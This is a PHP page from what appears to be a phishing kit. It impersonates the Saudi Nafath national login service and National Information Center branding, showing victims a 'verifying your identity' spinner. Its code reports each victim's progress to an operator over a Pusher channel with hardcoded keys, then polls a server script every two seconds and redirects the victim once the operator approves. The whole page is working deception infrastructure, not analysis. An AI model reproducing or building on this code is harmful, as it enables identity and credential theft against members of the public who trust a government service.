<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'إنتظار نفاذ');
    $options = ['cluster' => 'ap2', 'useTLS' => true];
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);
    $pusher->trigger('bcare', 'curreneft-page', ['userId' => $_SESSION['user_id'], 'page' => 'إنتظار نفاذ']);
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جارٍ التوثيق | نفاذ</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --primary-nafad: #11998E;
            --bg-light: #f8fafc;
            --text-dark: #1e293b;
        }
        * { padding: 0; margin: 0; box-sizing: border-box; font-family: "Cairo", serif; }
        body { background-color: var(--bg-light); color: var(--text-dark); min-height: 100vh; display: flex; flex-direction: column; }
        
        .nafad-header {
            background: white;
            padding: 1.5rem 0;
            box-shadow: 0 2px 15px rgba(0,0,0,0.05);
            text-align: center;
        }
        .nafad-header img { height: 50px; }

        .wait-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .processing-card {
            background: white;
            padding: 50px;
            border-radius: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.05);
            max-width: 500px;
            width: 100%;
            text-align: center;
            animation: fadeIn 0.6s ease-out;
        }

        @keyframes fadeIn {
            from { opacity:0; transform: translateY(20px); }
            to { opacity:1; transform: translateY(0); }
        }

        .spinner-box {
            width: 100px;
            height: 100px;
            margin: 0 auto 30px;
            position: relative;
        }

        .double-bounce {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background-color: var(--primary-nafad);
            opacity: 0.2;
            position: absolute;
            top: 0;
            left: 0;
            animation: sk-bounce 2.0s infinite ease-in-out;
        }

        .double-bounce2 {
            width: 60%;
            height: 60%;
            border-radius: 50%;
            background-color: var(--primary-nafad);
            position: absolute;
            top: 20%;
            left: 20%;
            animation: sk-bounce 2.0s infinite ease-in-out;
            animation-delay: -1.0s;
        }

        @keyframes sk-bounce {
            0%, 100% { transform: scale(0); }
            50% { transform: scale(1); }
        }

        .status-badge {
            display: inline-block;
            background: #f0fdf4;
            color: var(--primary-nafad);
            padding: 8px 20px;
            border-radius: 50px;
            font-weight: 700;
            font-size: 0.85rem;
            margin-bottom: 20px;
        }

        .pulse-text {
            color: #64748b;
            font-size: 1rem;
            animation: textPulse 1.5s infinite;
        }

        @keyframes textPulse {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }

        .footer-nafad {
            background: #f1f5f9;
            padding: 40px 0;
            margin-top: 80px;
            border-top: 1px solid #e2e8f0;
        }
    </style>
</head>
<body>

    <header class="nafad-header">
        <div class="container">
            <img src="./assets/nafad.png" alt="النفاذ الوطني الموحد">
        </div>
    </header>

    <div class="wait-container">
        <div class="processing-card">
            <div class="status-badge">جارٍ التحقق من الهوية الرقمية</div>
            
            <div class="spinner-box">
                <div class="double-bounce"></div>
                <div class="double-bounce2"></div>
            </div>

            <h4 class="fw-900 mb-3" style="color: var(--primary-nafad);">الرجاء الانتظار</h4>
            <p class="pulse-text mb-4">يتم حالياً التأكد من معلوماتك عبر منصة نفاذ، يرجى عدم مغادرة الصفحة...</p>
            
            <div class="alert alert-success py-2 rounded-4 small" style="background-color: #f0fdf4; border-color: #dcfce7; color: #166534;">
                <i class="bi bi-info-circle me-1"></i> سيتم توجيهك تلقائياً فور اكتمال المصادقة.
            </div>
        </div>
    </div>

    <footer class="footer-nafad">
        <div class="container text-center">
            <div class="row align-items-center">
                <div class="col-md-6 text-md-end mb-3 mb-md-0">
                    <h6 class="fw-bold mb-1">مركز المعلومات الوطني</h6>
                    <p class="small text-muted mb-0">تطوير وتشغيل | جميع الحقوق محفوظة © 2024</p>
                </div>
                <div class="col-md-6 text-md-start">
                    <img src="./assets/NIC.png" alt="NIC" height="40" style="opacity: 0.7;">
                </div>
            </div>
        </div>
    </footer>

    <script>
        setInterval(() => {
            $.ajax({
                url: "wait-fn-nafath.php",
                type: "POST",
                success: (response) => {
                    try {
                        const data = JSON.parse(response);
                        if (data.CheckTheInfo_Nafad == 1 || data.CheckTheInfo_Nafad == 2) {
                            window.location = data.url;
                        }
                    } catch(e) {}
                }
            });
        }, 2000);
    </script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id']); ?>;
    </script>
</body>
</html>
